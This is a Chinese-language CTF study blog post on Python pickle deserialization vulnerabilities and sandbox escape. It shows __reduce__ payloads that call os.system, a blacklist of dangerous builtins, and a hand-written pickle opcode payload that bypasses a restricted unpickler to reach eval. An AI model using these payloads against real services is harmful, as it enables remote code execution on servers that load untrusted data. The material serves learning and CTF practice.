<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://ppcrab.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://ppcrab.github.io/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">



   <a href="https://github.com/you"><img style="position: absolute; top: 0; right: 0; border: 0;"  src="https://ppcrab.github.io/" alt="Fork me on  GitHub"></a>
   






  
  
    
  
   
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-music">
          <a href="/music" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
            
            喜欢的一些音乐
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
            
            我读过的一些书籍以及笔记
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/18/Python反序列化漏洞以及沙箱逃逸/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/18/Python反序列化漏洞以及沙箱逃逸/" itemprop="url">Python反序列化漏洞以及沙箱逃逸</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-18T22:40:58+08:00">
                2019-08-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  2.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  10
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>打2019Suctf的时候遇到了一个python反序列化漏洞的题目，学习了一波，由于没有接触过并且python水平确实不够，学习的很困难，没有搞出来。tcl.gg</p>
<p>不过学习还是要学习的</p>
<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><blockquote>
<p>当程序运行时，所有的变量或者对象都是存储到内存中的，一旦程序调用完成，这些变量或者对象所占有的内存都会被回收。而为了实现变量和对象持久化的存储到磁盘中或在网络上进行传输，我们需要将变量或者对象转化为二进制流的方式。 而将其转化为二进制流的过程就是序列化。</p>
</blockquote>
<p>我在刚看到这段定义的时候，并不是很理解，<strong>为了实现变量和对象持久化的存储到磁盘中或在网络上进行传输</strong>这句话。所以我去找了持久化和序列化的区别：</p>
<blockquote>
<p><a href="http://baike.baidu.com/view/2472114.htm" target="_blank" rel="noopener">持久</a><a href="http://baike.baidu.com/view/270175.htm" target="_blank" rel="noopener">化</a>（Persistence），即把<a href="http://baike.baidu.com/subview/38752/8058696.htm" target="_blank" rel="noopener">数据</a>（如内存中的对象）保存到可永久保存的存储设备中（如磁盘）。持久化的主要应用是将内存中的对象存储在关系型的数据库中，当然也可以存储在磁盘文件中、XML数据文件中等等。</p>
<p>持久化是将程序数据在持久状态和瞬时状态间转换的机制。</p>
<p>持久化是一种对象服务，就是把内存中的对象保存到外存中，让以后能够取回。需要实现至少3个接口：</p>
<p>void Save(object o) 把一个对象保存到外存中</p>
<p>Object Load(object oid) 通过对象标识从外存中取回对象</p>
<p>bool<a href="http://baike.baidu.com/view/1229931.htm" target="_blank" rel="noopener">Exists</a>(object oid) 检查外存中是否存在某个对象</p>
</blockquote>
<p>至于为什么需要持久化，这是由于内存的固有缺陷引起的，因为内存无法永久的储存数据，比如断电，进程退出。立马gg</p>
<blockquote>
<p>序列化也是一种对象服务，就是把内存中的对象序列化成<a href="https://www.zhihu.com/question/38075755" target="_blank" rel="noopener">流</a>、或者把流反序列化成对象。</p>
<p>序列化是为了解决对象的传输问题，传输可以在<a href="http://baike.baidu.com/view/1053.htm" target="_blank" rel="noopener">线程</a>之间、进程之间、内存外存之间、<a href="http://baike.baidu.com/view/23880.htm" target="_blank" rel="noopener">主机</a>之间进行。我之所以在这里提到序列化，是因为我们可以利用序列化来辅助持久化，可以说凡是可以持久化的对象都可以序列化，因为序列化相对容易一些（也不是很容易），所以主流的软件基础设施，比如.net和java，已经把序列化的框架完成了</p>
</blockquote>
<p>好了，最基础的东西明白了，继续</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>而反序列化就是说程序运行的时候不能从磁盘中进行读取，需要将序列化的对象或者变量从磁盘中转移到内存中，同时也会将二进制流转换为原来的数据格式。我们把这一过程叫做反序列化。</p>
<p>可以看到这里的序列化和反序列化提到了网络传输，所以，如果这种传输方式有漏洞，那么利用这种漏洞就可以作为我们获得远程权限的方式。</p>
<h3 id="python的序列化反序列化模块pickle和json"><a href="#python的序列化反序列化模块pickle和json" class="headerlink" title="python的序列化反序列化模块pickle和json"></a>python的序列化反序列化模块pickle和json</h3><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">dict2 = pickle.dumps(dict1)</span><br><span class="line"></span><br><span class="line">print(dict2,type(dict2),id(dict2))</span><br><span class="line"></span><br><span class="line">dict3 = pickle.loads(dict2)</span><br><span class="line"></span><br><span class="line">print(dict3,type(dict3),id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03&#125;q\x00(X\x01\x00\x00\x00aq\x01K\x01X\x01\x00\x00\x00bq\x02K\x02u.&apos; &lt;class &apos;bytes&apos;&gt; 1798082169904</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 1798080970112</span><br></pre></td></tr></table></figure>
<p>从这个结果也可以进一步理解序列化与内存的关系，很明显，这两者在内存中的地址变了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">file = open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>)</span><br><span class="line">dict2 = pickle.dump(dict1, file)</span><br><span class="line">file.close()</span><br><span class="line">print(dict2, type(dict2), id(dict2))</span><br><span class="line">file1 = open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">dict3 = pickle.load(file1)</span><br><span class="line">file1.close()</span><br><span class="line">print(dict3, type(dict3), id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> None &lt;class &apos;NoneType&apos;&gt; 1665574096</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 2223480349680</span><br></pre></td></tr></table></figure>
<h4 id="json"><a href="#json" class="headerlink" title="json"></a>json</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict2 = json.dumps(dict1)</span><br><span class="line">print(dict2, type(dict2), id(dict2))</span><br><span class="line">dict3 = json.loads(dict2)</span><br><span class="line">print(dict3, type(dict3), id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125; &lt;class &apos;str&apos;&gt; 2165132891960</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 2165130960184</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">file1 = open(<span class="string">'1.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">dict2 = json.dump(dict1, file1)</span><br><span class="line">file1.close()</span><br><span class="line">print(dict2, type(dict2), id(dict2))</span><br><span class="line">file2 = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">dict3 = json.load(file2)</span><br><span class="line">print(dict3, type(dict3), id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">None &lt;class &apos;NoneType&apos;&gt; 1665574096</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 2161938798992</span><br></pre></td></tr></table></figure>
<p>我要先搞一波pickle的漏洞</p>
<h3 id="python反序列化漏洞的原因"><a href="#python反序列化漏洞的原因" class="headerlink" title="python反序列化漏洞的原因"></a>python反序列化漏洞的原因</h3><p>序列化对象的时候，类中的自动执行的函数也会被序列化，并且在反序列化的时候，该函数(<strong> reduce </strong>)会直接被执行。</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:<br>A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. ……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xuliehua</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'echo "Hello,world"'</span>,))</span><br><span class="line">d = xuliehua()</span><br><span class="line">de = pickle.dumps(d)</span><br><span class="line">print(de)</span><br><span class="line">pickle.loads(de)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03cnt\nsystem\nq\x00X\x08\x00\x00\x00echo &quot;H&quot;q\x01\x85q\x02Rq\x03.&apos;</span><br><span class="line">&quot;Hello,world&quot;</span><br></pre></td></tr></table></figure>
<p>也就是说，如果直接采用pickle.loads()去反序列化。结果是我们不能承受的，因为这里的命令我们可以随便填写的，相当于我们控制了对面的服务器，可还行？</p>
<h4 id="保护-限制"><a href="#保护-限制" class="headerlink" title="保护-限制"></a>保护-限制</h4><h5 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h5><p><a href="https://docs.python.org/3.7/library/pickle.html#pickle-restrict" target="_blank" rel="noopener">官方文档</a>给出了优化的例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">'range'</span>,</span><br><span class="line">    <span class="string">'complex'</span>,</span><br><span class="line">    <span class="string">'set'</span>,</span><br><span class="line">    <span class="string">'frozenset'</span>,</span><br><span class="line">    <span class="string">'slice'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
<p>可以很清楚的看到，使用了中间类RestrictedUnpickler来反序列化，并加入白名单。只允许我们允许的类以及方法，这就有点东西了。</p>
<p>比如我们仍然将我们想要进行攻击的数据写成这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xuliehua</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'echo "Hello,world"'</span>,))</span><br><span class="line">d = xuliehua()</span><br><span class="line">de = pickle.dumps(d)</span><br><span class="line">restricted_loads(de)</span><br></pre></td></tr></table></figure>
<p>得到的是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_pickle.UnpicklingError: global &apos;nt.system&apos; is forbidden</span><br></pre></td></tr></table></figure>
<p>也就是说我们成功的将条件限制在了<em>module == “builtins” and name in safe_builtins</em> </p>
<h5 id="example2"><a href="#example2" class="headerlink" title="example2"></a>example2</h5><p>然而，有一些限制有时候并不能阻止我们的攻击，比如hackergame2017的Hide and Seek题目中</p>
<p>限制条件为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">"usingclass"</span> <span class="keyword">and</span> name == <span class="string">'file_contents'</span>:</span><br><span class="line">      <span class="keyword">return</span> file_contents</span><br><span class="line"><span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"module='%s', name='%s' 是非法的"</span> % (module, name))</span><br></pre></td></tr></table></figure>
<p>我们可以看到，限制了我们的类名必须是usingclass，方法必须是file_contents</p>
<p>实际上，限制条件往往需要我们去试验，这种限制条件正常情况下怎么可能直接告诉你</p>
<p>so，此时我们只需要满足这个条件就可以了，十分简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_contents</span><span class="params">( filename , mode = <span class="string">'r'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Credentials</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (file_contents,(<span class="string">'flag.py'</span>,))</span><br><span class="line">apple = pickle.dumps(Credentials())</span><br><span class="line">print(apple)</span><br><span class="line">apple = apple.replace(<span class="string">b'__main__'</span>,<span class="string">b'usingname'</span>) </span><br><span class="line">orange = safe_unpickle(apple)</span><br><span class="line">print(orange)</span><br></pre></td></tr></table></figure>
<p>实际上，我们只是猜测了服务器端原有的usingclass模块含有的file_contents()函数的功能是读取文件内容。</p>
<p>而实际传输的序列化数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03cusingclass\nfile_contents\nq\x00X\x07\x00\x00\x00flag.pyq\x01\x85q\x02Rq\x03.&apos;</span><br></pre></td></tr></table></figure>
<p>仅仅是帮助满足了限制条件，顺便填充了栈，进而在return时调用file_content.(ps)</p>
<p> <img src="/2019/08/18/Python反序列化漏洞以及沙箱逃逸/1.PNG" alt="1"></p>
<p>所以说，这里并不是usingclass在调用file_contents模块，而是恰好语句构成的栈环境与下面的语句联系起来了。</p>
<p>当然，我们可以对我们的safeupickle进行一点改进</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">"usingclass"</span> <span class="keyword">and</span> name == <span class="string">'file_contents'</span>:</span><br><span class="line">       <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
<p>这就成了调用了~，nice</p>
<h5 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h5><p>关键的语句如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"><span class="string">"......................................"</span></span><br><span class="line"><span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> blacklist:</span><br><span class="line">         <span class="keyword">return</span> getattr(builtins, name)</span><br></pre></td></tr></table></figure>
<p>我试图通过map绕过这个限制,重新调用exec()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xuliehua</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (map,((builtins.<span class="keyword">exec</span>[<span class="string">"__import__('os').system('dir')"</span>])))</span><br></pre></td></tr></table></figure>
<p>结果确实报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_pickle.UnpicklingError: global &apos;builtins.exec&apos; is forbidden</span><br></pre></td></tr></table></figure>
<p>并且我通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> blacklist:</span><br><span class="line">      print(<span class="string">"right"</span>)</span><br><span class="line">      <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">      print(<span class="string">"Error"</span>)</span><br></pre></td></tr></table></figure>
<p>的结果显示，明白了，反序列化的过程中，似乎这个检查没那么简单，并不是只检查一个外层模块就完事了。有点迷，看来需要学习新的知识了</p>
<h6 id="手搓payload-amp-pickle语言的学习"><a href="#手搓payload-amp-pickle语言的学习" class="headerlink" title="手搓payload &amp;pickle语言的学习"></a>手搓payload &amp;pickle语言的学习</h6><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#pickle-code" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#pickle-code</a></p>
<p> <img src="/2019/08/18/Python反序列化漏洞以及沙箱逃逸/6e3ef780-5535-4a7d-98c4-88edb18faf9f.864e0472fcb8.png" alt="6e3ef780-5535-4a7d-98c4-88edb18faf9f.864e0472fcb8"></p>
<p>以这个题目中给出的payload例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">de = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S'eval'</span></span><br><span class="line"><span class="string">tR(S'__import__("os").system("dir")'</span></span><br><span class="line"><span class="string">tR.'''</span></span><br><span class="line">print(de)</span><br><span class="line">restricted_loads(de)</span><br><span class="line"><span class="string">"我们稍加修改一下find_class函数中的一些语句"</span></span><br><span class="line"><span class="string">"......."</span></span><br><span class="line"> <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> blacklist:</span><br><span class="line">         print(module,<span class="string">"   "</span>,name)</span><br><span class="line">         <span class="keyword">return</span> getattr(builtins, name)</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&apos;cbuiltins\ngetattr\n(cbuiltins\ndict\nS\&apos;get\&apos;\ntR(cbuiltins\nglobals\n(tRS\&apos;builtins\&apos;\ntRp1\ncbuiltins\ngetattr\n(g1\nS\&apos;eval\&apos;\ntR(S\&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)\&apos;\ntR.&apos;</span><br><span class="line">rightbuiltins     getattr</span><br><span class="line">rightbuiltins     dict</span><br><span class="line">rightbuiltins     globals</span><br><span class="line">rightbuiltins     getattr</span><br></pre></td></tr></table></figure>
<p>对比我们的payload与debug的数据，不难发现，检查所限制的仅仅是通过<code>c</code>修饰的语句，这一点从表中也可以看出 </p>
<p>除此之外，我们还可以得到一些我们以后构造payload可能会用到的经验</p>
<p><code>S</code> 、 <code>V</code> ：翻译出来的语句的作用为，1.充当参数   2.模块下的函数引用</p>
<p>看起来和汇编shellcode差不多，熟能生巧，看得多了自然就会了，总之，限制稍微难一点的程序构造的payload都是需要我们进行手搓pickle的，gg</p>
<h5 id="example4"><a href="#example4" class="headerlink" title="example4"></a>example4</h5><p>Suctf2019 guess_game</p>
<p>这个题目我个小菜鸡觉得与前面的不同的是，他在运行代码的时候，目的是为了改变已有的game对象的值，以达到服务器端后续的检查绕过。</p>
